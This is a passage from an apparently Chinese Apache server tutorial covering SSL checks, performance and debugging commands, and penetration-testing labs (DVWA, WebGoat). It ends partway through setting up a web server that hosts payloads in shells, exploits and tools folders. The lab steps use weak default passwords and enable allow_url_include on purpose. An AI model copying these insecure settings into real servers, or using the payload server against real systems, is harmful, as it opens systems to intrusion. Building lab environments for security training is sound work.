<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 检查证书和密钥是否匹配</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">openssl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> x509</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -noout</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -modulus</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -in</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/ssl/cert.crt</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> openssl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> md5</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">openssl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> rsa</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -noout</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -modulus</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -in</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/ssl/cert.key</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> openssl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> md5</span></span></code></pre></figure>
<h3 id="6-性能诊断">6. 性能诊断<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#6-性能诊断" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 使用Apache Bench测试性能</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ab</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -n</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1000</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -c</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 10</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> http://localhost/</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 参数说明：</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># -n: 总请求数</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># -c: 并发数</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># -t: 测试时间（秒）</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 使用Apache自带的server-status</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> status</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 在配置中添加：</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># &lt;Location &quot;/server-status&quot;></span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#     SetHandler server-status</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#     Require local</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># &lt;/Location></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 访问状态页面</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> http://localhost/server-status</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查看Apache进程资源使用</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ps</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> aux</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> grep</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> awk</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> '{sum+=$6} END {print &quot;Total Memory (KB): &quot; sum}'</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 使用top监控</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">top</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">pgrep</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">','</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span></code></pre></figure>
<h3 id="7-调试技巧">7. 调试技巧<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#7-调试技巧" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用详细日志</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nano</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/apache2.conf</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 设置: LogLevel debug</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用模块调试</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">LogLevel</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> warn</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ssl:trace3</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> rewrite:trace8</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 使用strace跟踪Apache进程</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> strace</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">pgrep</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> head</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 检查Apache配置包含关系</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -t</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> DUMP_INCLUDES</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 测试特定虚拟主机</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -H</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;Host: testsite.local&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> http://localhost/</span></span></code></pre></figure>
<h2 id="十渗透测试应用场景">十、渗透测试应用场景<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#十渗透测试应用场景" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="1-搭建dvwa测试环境">1. 搭建DVWA测试环境<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#1-搭建dvwa测试环境" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 安装必要软件</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apt</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> install</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mysql-server</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> php</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> libapache2-mod-php</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> php-mysql</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> php-gd</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -y</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 下载DVWA</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">cd</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> git</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> clone</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> https://github.com/digininja/DVWA.git</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 配置权限</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> chown</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -R</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> www-data:www-data</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/DVWA</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> chmod</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -R</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 755</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/DVWA</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 配置数据库</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mysql</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> root</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="sql" data-theme="github-light github-dark"><code data-language="sql" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">CREATE</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> DATABASE</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> dvwa</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">CREATE</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> USER</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> '</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">dvwa</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">'@</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'localhost'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> IDENTIFIED </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">BY</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 'p@ssw0rd'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">GRANT</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ALL PRIVILEGES </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">ON</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> dvwa.</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">*</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> TO</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 'dvwa'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">@</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'localhost'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">FLUSH PRIVILEGES;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">EXIT;</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 配置DVWA</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">cd</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/DVWA/config</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> cp</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> config.inc.php.dist</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> config.inc.php</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nano</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> config.inc.php</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 修改数据库配置</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$_DVWA[ </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'db_user'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ] = </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'dvwa'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$_DVWA</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">[</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 'db_password'</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ]</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 'p@ssw0rd'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$_DVWA</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">[</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 'db_database'</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ]</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 'dvwa'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 配置PHP</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nano</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/php/8.2/apache2/php.ini</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 修改: allow_url_include = On</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 重启Apache</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> restart</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 访问DVWA进行初始化</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># http://localhost/DVWA/setup.php</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 默认账号: admin / password</span></span></code></pre></figure>
<h3 id="2-搭建webgoat环境">2. 搭建WebGoat环境<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#2-搭建webgoat环境" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 安装Java</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apt</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> install</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> default-jdk</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -y</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 下载WebGoat</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">cd</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /opt</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> wget</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> https://github.com/WebGoat/WebGoat/releases/download/v8.2.2/webgoat-server-8.2.2.jar</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 运行WebGoat</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">java</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -jar</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> webgoat-server-8.2.2.jar</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 使用Apache反向代理</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> proxy</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> proxy_http</span></span></code></pre></figure>
<p><strong>反向代理配置：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> *:80</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ServerName</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> webgoat.local</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ProxyPreserveHost</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> On</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ProxyPass</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> / http://localhost:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">8080</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ProxyPassReverse</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> / http://localhost:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">8080</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ErrorLog</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ${APACHE_LOG_DIR}/webgoat-error.log</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    CustomLog</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ${APACHE_LOG_DIR}/webgoat-access.log combined</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<h3 id="3-托管payload文件服务器">3. 托管Payload文件服务器<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#3-托管payload文件服务器" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 创建payload目录</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mkdir</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/payloads/{shells,exploits,tools}</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 设置适当权限</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> chown</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -R</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> www-data:www-data</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/payloads</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> chmod</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -R</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 755</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/payloads</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 创建简单的文件列表页面</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">cat</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> &lt;&lt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 'EOF'</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tee</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/payloads/index.php</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;?php</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">$dir = '.';</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">$files = scandir($dir);</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">echo &quot;&lt;h2>Available Payloads&lt;/h2>&lt;ul>&quot;;</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">foreach($files as $file) {</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    if($file != '.' &amp;&amp; $file != '..') {</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        echo &quot;&lt;li>&lt;a href='$file'>$file&lt;/a>&lt;/li>&quot;;</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    }</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">}</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">echo &quot;&lt;/ul>&quot;;</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">?></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">EOF</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 快速启动临时HTTP服务器（Python方式）</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">cd</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /tmp/payloads</span></span>
